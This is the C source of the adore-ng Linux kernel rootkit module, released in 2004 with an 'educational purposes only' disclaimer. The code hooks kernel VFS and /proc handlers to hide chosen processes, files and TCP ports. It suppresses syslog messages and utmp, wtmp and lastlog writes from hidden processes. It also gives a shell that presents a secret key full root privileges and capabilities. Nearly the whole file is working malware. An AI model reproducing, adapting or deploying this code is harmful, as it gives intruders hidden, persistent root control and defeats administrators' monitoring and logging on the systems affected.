/*** (C) 2004 by Stealth
 ***
 *** http://spider.scorpions.net/~stealth
 *** http://stealth.7350.org/rootkits
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 ***/
#define __KERNEL__
#define MODULE


#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/proc_fs.h>
#include <linux/capability.h>
#include <linux/net.h>
#include <linux/skbuff.h>
#include <linux/spinlock.h>
#include <net/sock.h>
#include <linux/un.h>
#include <net/af_unix.h>

#include "adore-ng.h"


char *proc_fs = "/proc";	/* default proc FS to hide processes */
MODULE_PARM(proc_fs, "s");
char *root_fs = "/";		/* default FS to hide files */

MODULE_PARM(root_fs, "s");
char *opt_fs = NULL;
MODULE_PARM(opt_fs, "s");


typedef int (*readdir_t)(struct file *, void *, filldir_t);
readdir_t orig_root_readdir = NULL, orig_opt_readdir = NULL,
          orig_proc_readdir = NULL;

struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *) = NULL;


int cleanup_module();

static int tcp_new_size();
static int (*o_get_info_tcp)(char *, char **, off_t, int);

extern struct socket *sockfd_lookup(int fd, int *err);
extern __inline__ void sockfd_put(struct socket *sock)
{
        fput(sock->file);
}

#ifndef PID_MAX
#define PID_MAX 0x8000
#endif

static char hidden_procs[PID_MAX/8+1];

inline void hide_proc(pid_t x)
{
	if (x >= PID_MAX || x == 1)
		return;
	hidden_procs[x/8] |= 1<<(x%8);
}

inline void unhide_proc(pid_t x)
{
	if (x >= PID_MAX)
		return;
	hidden_procs[x/8] &= ~(1<<(x%8));
}

inline char is_invisible(pid_t x)
{
	if (x >= PID_MAX)
		return 0;
	return hidden_procs[x/8]&(1<<(x%8));
}

/* Theres some crap after the PID-filename on proc
 * getdents() so the semantics of this function changed:
 * Make "672" -> 672 and
 * "672|@\"   -> 672 too
 */
int adore_atoi(const char *str)
{
	int ret = 0, mul = 1;
	const char *ptr;
   
	for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
		;
	ptr--;
        while (ptr >= str) {
		if (*ptr < '0' || *ptr > '9')
            		break;
		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;
	}
	return ret;
}

/* Own implementation of find_task_by_pid() */
struct task_struct *adore_find_task(pid_t pid)
{
	struct task_struct *p;

	read_lock(&tasklist_lock);	// XXX: locking necessary?
	for_each_task(p) {
		if (p->pid == pid) {
			read_unlock(&tasklist_lock);
			return p;
		}
	}
	read_unlock(&tasklist_lock);
	return NULL;
}

int should_be_hidden(pid_t pid)
{
	struct task_struct *p = NULL;

	if (is_invisible(pid)) {
		return 1;
	}

	p = adore_find_task(pid);
	if (!p)
		return 0;

	/* If the parent is hidden, we are hidden too XXX */
	task_lock(p);

	if (is_invisible(p->p_pptr->pid)) {
		task_unlock(p);
		hide_proc(pid);
		return 1;
	}

	task_unlock(p);
	return 0;
}

/* You can control adore-ng without ava too:
 *
 * echo > /proc/<ADORE_KEY> will make the shell authenticated,
 * cat /proc/hide-<PID> from such a shell will hide PID,
 * cat /proc/unhide-<PID> will unhide the process
 * cat /proc/uninstall will uninstall adore
 */
struct dentry *adore_lookup(struct inode *i, struct dentry *d)
{

	task_lock(current);

	if (strncmp(ADORE_KEY, d->d_iname, strlen(ADORE_KEY)) == 0) {
		current->flags |= PF_AUTH;
		current->suid = ADORE_VERSION;
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "fullprivs", 9) == 0) {
		current->uid = 0;
		current->suid = 0;
		current->euid = 0;
	    	current->gid = 0;
		current->egid = 0;
	    	current->fsuid = 0;
		current->fsgid = 0;

		cap_set_full(current->cap_effective);
		cap_set_full(current->cap_inheritable);
		cap_set_full(current->cap_permitted);
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "hide-", 5) == 0) {
		hide_proc(adore_atoi(d->d_iname+5));
	} else if ((current->flags & PF_AUTH) &&
	           strncmp(d->d_iname, "unhide-", 7) == 0) {
		unhide_proc(adore_atoi(d->d_iname+7));
	} else if ((current->flags & PF_AUTH) &&
		   strncmp(d->d_iname, "uninstall", 9) == 0) {
			cleanup_module();
	}

	task_unlock(current);

	if (should_be_hidden(adore_atoi(d->d_iname)) &&
	/* A hidden ps must be able to see itself! */
	    !should_be_hidden(current->pid))
		return NULL;

	return orig_proc_lookup(i, d);
}


filldir_t proc_filldir = NULL;
spinlock_t proc_filldir_lock = SPIN_LOCK_UNLOCKED;

int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	if (should_be_hidden(adore_atoi(name)))
		return 0;
	return proc_filldir(buf, name, nlen, off, ino, x);
}



int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	spin_lock(&proc_filldir_lock);
	proc_filldir = filldir;
	r = orig_proc_readdir(fp, buf, adore_proc_filldir);
	spin_unlock(&proc_filldir_lock);
	return r;
}


filldir_t opt_filldir = NULL;
struct super_block *opt_sb[1024];

int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct inode *inode = NULL;
	int r = 0;
	uid_t uid;
	gid_t gid;

	if ((inode = iget(opt_sb[current->pid % 1024], ino)) == NULL)
		return 0;
	uid = inode->i_uid;
	gid = inode->i_gid;
	iput(inode);

	/* Is it hidden ? */
	if (uid == ELITE_UID && gid == ELITE_GID) {
		r = 0;
	} else
		r = opt_filldir(buf, name, nlen, off, ino, x);

	return r;
}


int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt)
		return 0;

	opt_filldir = filldir;
	opt_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
	r = orig_opt_readdir(fp, buf, adore_opt_filldir);
	
	return r;
}


/* About the locking of these global vars:
 * I used to lock these via rwlocks but on SMP systems this can cause
 * a deadlock because the iget() locks an inode itself and I guess this
 * could cause a locking situation of AB BA. So, I do not lock root_sb and
 * root_filldir (same with opt_) anymore. root_filldir should anyway always
 * be the same (filldir64 or filldir, depending on the libc). The worst thing that
 * could happen is that 2 processes call filldir where the 2nd is replacing
 * root_sb which affects the 1st process which AT WORST CASE shows the hidden files.
 * Following conditions have to be met then: 1. SMP 2. 2 processes calling getdents()
 * on 2 different partitions with the same FS.
 * Now, since I made an array of super_blocks it must also be that the PIDs of
 * these procs have to be the same PID modulo 1024. This sitation (all 3 cases must
 * be met) should be very very rare.
 */
filldir_t root_filldir = NULL;
struct super_block *root_sb[1024];


int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct inode *inode = NULL;
	int r = 0;
	uid_t uid;
	gid_t gid;

	if ((inode = iget(root_sb[current->pid % 1024], ino)) == NULL)
		return 0;
	uid = inode->i_uid;
	gid = inode->i_gid;
	iput(inode);

	/* Is it hidden ? */
	if (uid == ELITE_UID && gid == ELITE_GID) {
		r = 0;
	} else
		r = root_filldir(buf, name, nlen, off, ino, x);

	return r;
}


int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt)
		return 0;

	root_filldir = filldir;
	root_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
	r = orig_root_readdir(fp, buf, adore_root_filldir);
	return r;
}


int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
{
	struct file *filep;
	
        if ((filep = filp_open(p, O_RDONLY, 0)) == NULL) {
                return -1;
	}

	if (orig_readdir)
		*orig_readdir = filep->f_op->readdir;

	filep->f_op->readdir = new_readdir;
	filp_close(filep, 0);
	return 0;
}


int unpatch_vfs(const char *p, readdir_t orig_readdir)
{
	struct file *filep;
	
        if ((filep = filp_open(p, O_RDONLY, 0)) == NULL) {
                return -1;
	}

	filep->f_op->readdir = orig_readdir;
	filp_close(filep, 0);
	return 0;
}


char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
	if (s-haystack+strlen(needle) <= n)
		return s;
	else
		return NULL;
}


struct proc_dir_entry *proc_find_tcp()
{
	struct proc_dir_entry *p = proc_net->subdir;

	while (strcmp(p->name, "tcp"))
		p = p->next;
	return p;
}


/* Reading from /proc/net/tcp gives back data in chunks
 * of NET_CHUNK. We try to match these against hidden ports
 * and remove them respectively
 */
#define NET_CHUNK 150
int n_get_info_tcp(char *page, char **start, off_t pos, int count)
{
	int r = 0, i = 0, n = 0, hidden = 0;
	char port[10], *ptr = NULL, *mem = NULL, *it = NULL;

	/* Admin accessing beyond sizeof patched file? */
	if (pos >= tcp_new_size())
		return 0;
	
	r = o_get_info_tcp(page, start, pos, count);

	if (r <= 0)// NET_CHUNK)
		return r;

	mem = (char *)kmalloc(r+NET_CHUNK+1, GFP_KERNEL);
	if (!mem)
		return r;

	memset(mem, 0, r+NET_CHUNK+1);
	it = mem;

	/* If pos < NET_CHUNK then theres preamble which we can skip */
	if (pos >= NET_CHUNK) {
		ptr = page;
		n = (pos/NET_CHUNK) - 1;
	} else {
		memcpy(it, page, NET_CHUNK);
		it += NET_CHUNK;
		ptr = page + NET_CHUNK;
		n = 0;
	}

	for (; ptr < page+r; ptr += NET_CHUNK) {
		hidden = 0;
		for (i = 0; HIDDEN_SERVICES[i]; ++i) {
			sprintf(port, ":%04X", HIDDEN_SERVICES[i]);

			/* Ignore hidden blocks */
			if (strnstr(ptr, port, NET_CHUNK))
				hidden = 1;
		}
		if (!hidden) {
			sprintf(port, "%4d:", n);
			strncpy(ptr, port, strlen(port));
			memcpy(it, ptr, NET_CHUNK);
			it += NET_CHUNK;
			++n;
		}
	}

	memcpy(page, mem, r);
	n = strlen(mem);
	/* If we shrinked buffer, patch length */
	if (r > n)
		r = n;//-(*start-page);
	if (r < 0)
		r = 0;

//	*start = page + (*start-page);
	*start = page;
	kfree(mem);
	return r;
}


/* Calculate size of patched /proc/net/tcp */
int tcp_new_size()
{
	int r, hits = 0, i = 0, l = 10*NET_CHUNK;
	char *page = NULL, *start, *ptr, port[10];

	for (;;) {
		page = (char*)kmalloc(l+1, GFP_KERNEL);
		if (!page)
			return 0;
		r = o_get_info_tcp(page, &start, 0, l);
		if (r < l)
			break;
		l <<= 1;
		kfree(page);
	}

	for (ptr = start; ptr < start+r; ptr += NET_CHUNK) {
		for (i = 0; HIDDEN_SERVICES[i]; ++i) {
			sprintf(port, ":%04X", HIDDEN_SERVICES[i]);
			if (strnstr(ptr, port, NET_CHUNK)) {
				++hits;
				break;
			}
		}
	}
	kfree(page);
	return r - hits*NET_CHUNK;
}


static
int (*orig_unix_dgram_recvmsg)(struct socket *, struct msghdr *, int,
                      int, struct scm_cookie *) = NULL;
static struct proto_ops *unix_dgram_ops = NULL;

int adore_unix_dgram_recvmsg(struct socket *sock, struct msghdr *msg, int size,
                      int flags, struct scm_cookie *scm)
{
	struct sock *sk = NULL;
	int noblock = flags & MSG_DONTWAIT;
	struct sk_buff *skb = NULL;
	int err;
	struct ucred *creds = NULL;
	int not_done = 1;

	if (strcmp(current->comm, "syslogd") != 0 || !msg || !sock)
		goto out;

	sk = sock->sk;

	err = -EOPNOTSUPP;
	if (flags & MSG_OOB)
		goto out;

	do {
		msg->msg_namelen = 0;
	        skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
        	if (!skb)
                	goto out;
		creds = UNIXCREDS(skb);
		if (!creds)
			goto out;
		if ((not_done = should_be_hidden(creds->pid)))
			skb_dequeue(&sk->receive_queue);
	} while (not_done);

out:
	err = orig_unix_dgram_recvmsg(sock, msg, size, flags, scm);
        return err;
}


static struct file *var_files[] = {
	NULL,
	NULL,
	NULL,
	NULL
};

static char *var_filenames[] = {
	"/var/run/utmp",
	"/var/log/wtmp",
	"/var/log/lastlog",
	NULL
};

static
ssize_t (*orig_var_write)(struct file *, const char *, size_t, loff_t *) = NULL;

static
ssize_t adore_var_write(struct file *f, const char *buf, size_t blen, loff_t *off)
{
	int i = 0;

	/* If its hidden and if it has no special privileges and
	 * if it tries to write to the /var files, fake it
	 */
	if (should_be_hidden(current->pid) &&
	    !(current->flags & PF_AUTH)) {
		for (i = 0; var_filenames[i]; ++i) {
			if (var_files[i] &&
			    var_files[i]->f_dentry->d_inode->i_ino == f->f_dentry->d_inode->i_ino) {
				*off += blen;
				return blen;
			}
		}
	}
	return orig_var_write(f, buf, blen, off);
}	


static int patch_syslog()
{
	struct socket *sock = NULL;

	/* PF_UNIX, SOCK_DGRAM */
	if (sock_create(1, 2, 0, &sock) < 0)
		return -1;

	if (sock && (unix_dgram_ops = sock->ops)) {
		orig_unix_dgram_recvmsg = unix_dgram_ops->recvmsg;
		unix_dgram_ops->recvmsg = adore_unix_dgram_recvmsg;
		sock_release(sock);
	}

	return 0;
}


#ifdef RELINKED
extern int zero_module();
extern int zeronup_module();
#endif

int init_module()
{
	struct proc_dir_entry *pde = NULL;
	int i = 0, j = 0;

    	EXPORT_NO_SYMBOLS;

	memset(hidden_procs, 0, sizeof(hidden_procs));

	pde = proc_find_tcp();
	o_get_info_tcp = pde->get_info;
	pde->get_info = n_get_info_tcp;

	orig_proc_lookup = proc_root.proc_iops->lookup;
	proc_root.proc_iops->lookup = adore_lookup;

	patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
	patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
	if (opt_fs)
		patch_vfs(opt_fs, &orig_opt_readdir,
		          adore_opt_readdir);

	patch_syslog();

	j = 0;
	for (i = 0; var_filenames[i]; ++i) {
		var_files[i] = filp_open(var_filenames[i], O_RDONLY, 0);
		if (IS_ERR(var_files[i])) {
			var_files[i] = NULL;
			continue;
		}
		if (!j) {	/* just replace one time, its all the same FS */
			orig_var_write = var_files[i]->f_op->write;
			var_files[i]->f_op->write = adore_var_write;
			j = 1;
		}
	}
#ifdef RELINKED
	MOD_INC_USE_COUNT;
	zero_module();
#endif	
	return 0;
}


int cleanup_module()
{
	int i = 0, j = 0;

	proc_find_tcp()->get_info = o_get_info_tcp;
	proc_root.proc_iops->lookup = orig_proc_lookup;

	unpatch_vfs(proc_fs, orig_proc_readdir);
	unpatch_vfs(root_fs, orig_root_readdir);

	if (orig_opt_readdir)
		unpatch_vfs(opt_fs, orig_opt_readdir);

	/* In case where syslogd wasnt found in init_module() */
	if (unix_dgram_ops && orig_unix_dgram_recvmsg)
		unix_dgram_ops->recvmsg = orig_unix_dgram_recvmsg;

	j = 0;
	for (i = 0; var_filenames[i]; ++i) {
		if (var_files[i]) {
			if (!j) {
				var_files[i]->f_op->write = orig_var_write;
				j = 1;
			}
			filp_close(var_files[i], 0);
		}
	}

	return 0;
}

MODULE_LICENSE("GPL");

